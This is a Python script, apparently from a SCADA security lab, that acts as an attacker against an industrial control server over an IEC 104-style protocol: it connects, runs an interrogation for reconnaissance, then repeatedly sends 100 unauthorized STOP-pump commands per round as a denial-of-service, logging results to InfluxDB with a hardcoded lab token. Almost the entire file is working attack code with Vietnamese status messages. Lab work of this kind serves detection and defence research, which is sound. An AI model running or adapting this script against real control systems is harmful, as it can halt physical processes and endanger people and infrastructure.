import socket
import time

import c104
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

INFLUX_URL = "http://influxdb:8086"
INFLUX_TOKEN = "scada-token-123"
INFLUX_ORG = "scada-lab"
INFLUX_BUCKET = "scada-metrics"

_influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
_write_api = _influx.write_api(write_options=SYNCHRONOUS)


def push_metric(action, field_name, value):
	try:
		point = (
			Point("dnp3")
			.tag("container", "dnp3-attacker")
			.tag("action", action)
			.field(field_name, float(value))
		)
		_write_api.write(bucket=INFLUX_BUCKET, record=point)
	except Exception as e:
		print(f"InfluxDB write error: {e}")


def run_dnp3_attacker():
	ip = socket.gethostbyname("dnp3-server")
	client = c104.Client()
	connection = client.add_connection(ip=ip, port=20000, init=c104.Init.ALL)
	station = connection.add_station(common_address=1)

	# Monitoring points used during reconnaissance via integrity poll.
	station.add_point(io_address=10, type=c104.Type.M_SP_NA_1)
	station.add_point(io_address=20, type=c104.Type.M_ME_NC_1)
	station.add_point(io_address=30, type=c104.Type.M_ME_NC_1)

	pump_cmd = station.add_point(io_address=100, type=c104.Type.C_SC_NA_1)

	client.start()

	retries = 0
	while connection.state != c104.ConnectionState.OPEN:
		print(f"[Attacker] Đang chờ DNP3 server tại {connection.ip}:{connection.port} ...")
		time.sleep(3)
		retries += 1
		if retries > 20:
			print("[Attacker] Hết thời gian kết nối. Thoát.")
			return

	print(f"Kết nối thành công đến DNP3 Server! (Attacker)")

	while True:
		print("\n--- BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG ---")

		# Phase 1: Reconnaissance by triggering an integrity poll (GI equivalent).
		print("[PHASE 1] Quét: gửi integrity poll...")
		try:
			gi_ok = connection.interrogation(
				common_address=1,
				cause=c104.Cot.ACTIVATION,
				qualifier=c104.Qoi.STATION,
			)
			if gi_ok:
				print(f" [+] Quét integrity poll thành công.")
				push_metric("attack_recon", "gi_ok", 1)
			else:
				print(f" [!] Quét integrity poll thất bại.")
				push_metric("attack_recon", "gi_ok", 0)
		except Exception as e:
			print(f" Lỗi khi quét: {e}")

		time.sleep(2)

		# Phase 2: Unauthorized command flood (STOP pump) 100 times.
		if (gi_ok):
			print("\n[PHASE 2] Tấn công DoS: Gửi lệnh STOP bơm (C_SC_NA_1, IOA 100) lặp 100 lần...")
			success_count = 0

			for i in range(100):
				try:
					start_time = time.time()
					pump_cmd.value = False  # STOP pump
					ok = pump_cmd.transmit(cause=c104.Cot.ACTIVATION)
					latency = (time.time() - start_time) * 1000	# ms

					push_metric("write", "latency", latency)
					push_metric("write", "stop_cmd_value", 0)

					if ok:
						success_count += 1
					else:
						print(f" Ghi thất bại ở vòng {i + 1}")

					time.sleep(0.05)
				except Exception as e:
					print(f" Lỗi ghi ở vòng {i + 1}: {e}")

			print(f" [+] Giai đoạn 2 hoàn tất. Thành công gửi {success_count}/100 lệnh STOP.")
			print("--- KẾT THÚC ĐỢT TẤN CÔNG. CHỜ 30 GIÂY ---\n")
			time.sleep(30)
		else:
			print(" [!] Bỏ qua Phase 2 do quét thất bại.")
			print(" [+] Thử lại sau 15 giây...\n")
			time.sleep(15)


if __name__ == "__main__":
	run_dnp3_attacker()
